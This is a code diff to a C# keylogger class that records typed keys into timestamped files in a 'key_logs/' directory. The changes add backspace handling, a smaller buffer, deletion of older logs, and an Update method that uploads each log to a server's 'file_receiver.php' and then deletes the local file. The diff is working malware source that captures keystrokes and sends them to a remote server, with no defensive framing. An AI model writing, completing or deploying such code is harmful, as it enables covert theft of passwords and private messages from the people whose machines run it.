@@ -13,14 +13,23 @@ namespace IDK {
         // log file to which keys are currently logged
         private string CurrentLogFile;
 
+        // directory where log files are stored
+        private const string LOG_DIRECTORY = "key_logs/";
+
+        // base name of a key log file
+        private const string BASE_FILE_NAME = "KEY_LOG_";
+
         // string builder with typed words
         private StringBuilder Buffer;
 
         // max string buffer length measured in words
-        private const int MAX_BUFFER_LENGTH = 50;
+        private const int MAX_BUFFER_LENGTH = 20;
 
         // current string buffer length measured in words
         private int BufferLength;
+
+        // a flag indicating whether the log file can be uploaded or not
+        private volatile bool CanUpload = false;
 
         /// <summary>
         /// Class constructor
@@ -46,7 +55,7 @@ namespace IDK {
                 }
             } catch {
                 // if an exception occurs it means it's not a single character
-                switch (keyString) {
+                switch (keyString.ToUpper()) {
                     case "SPACE":
                         Buffer.Append(' ');
                         BufferLength++;
@@ -54,6 +63,9 @@ namespace IDK {
                     case "RETURN":
                         Buffer.AppendLine();
                         BufferLength++;
+                        break;
+                    case "BACK":
+                        Buffer.Remove(Buffer.Length - 1, 1);
                         break;
                     default:
                         Buffer.AppendLine();
@@ -63,8 +75,12 @@ namespace IDK {
                 }
 
                 if (BufferLength >= MAX_BUFFER_LENGTH) {
-                    BufferLength = 0;
+                    if (CurrentLogFile == null) {
+                        CreateOrAssignLogFile();
+                    }
+
                     WriteBufferToFile();
+                    BufferLength = 0;
                 }
             }
         }
@@ -75,6 +91,11 @@ namespace IDK {
         private void WriteBufferToFile() {
             using (StreamWriter writer = File.AppendText(CurrentLogFile)) {
                 writer.WriteLine(Buffer.ToString());
+                Buffer.Clear();
+
+                if (!CanUpload) {
+                    CanUpload = true;
+                }
             }
         }
 
@@ -82,15 +103,37 @@ namespace IDK {
         /// Performs required initializations. Called before execution of the task
         /// </summary>
         public override void Initialize() {
-            DirectoryInfo info = new DirectoryInfo("key_logs/");
+            DirectoryInfo info = new DirectoryInfo(LOG_DIRECTORY);
 
             if (!info.Exists) {
                 info.Create();
             }
 
-            CreateLogFile();
-
             Buffer = new StringBuilder();
+        }
+
+        /// <summary>
+        /// Creates a new key log file or assigns an existing file to the current log file
+        /// </summary>
+        private void CreateOrAssignLogFile() {
+            FileInfo[] files = new DirectoryInfo(LOG_DIRECTORY).GetFiles();
+
+            if (files.Length > 1) {
+                // there are files already, delete them
+                foreach (FileInfo file in files) {
+                    file.Delete();
+                }
+
+                CreateLogFile();
+            } else if (files.Length == 1) {
+                // there is only one file, if it is a log file, assign it to the current log file
+                if (files[0].Name.EndsWith(".txt") && files[0].Name.Contains(BASE_FILE_NAME)) {
+                     CurrentLogFile = LOG_DIRECTORY + files[0].Name;
+                }
+            } else {
+                // create a new key log file
+                CreateLogFile();
+            }
         }
 
         /// <summary>
@@ -98,7 +141,7 @@ namespace IDK {
         /// </summary>
         private void CreateLogFile() {
             DateTime now = DateTime.Now;
-            CurrentLogFile = "key_logs/KEY_LOG_" + now.Year + "_" + now.Month + "_" + now.Day + "_" + 
+            CurrentLogFile = LOG_DIRECTORY + BASE_FILE_NAME + now.Year + "_" + now.Month + "_" + now.Day + "_" +
                 now.Hour + "_" + now.Minute + "_" + now.Second + "_" + now.Millisecond + ".txt";
             File.CreateText(CurrentLogFile).Close();
         }
@@ -107,7 +150,16 @@ namespace IDK {
         /// Gets called when a tracked key report needs to be sent to the server
         /// </summary>
         public override void Update() {
-            // TODO: upload report file to the server and create a new log file
+            if (CanUpload) {
+                try {
+                    Network.UploadFile(Config.SERVER_BASE_URL + "file_receiver.php", CurrentLogFile);
+                    File.Delete(CurrentLogFile);
+                    CurrentLogFile = null;
+                    CanUpload = false;
+                } catch {
+                    Update();
+                }
+            }
         }
     }
 }
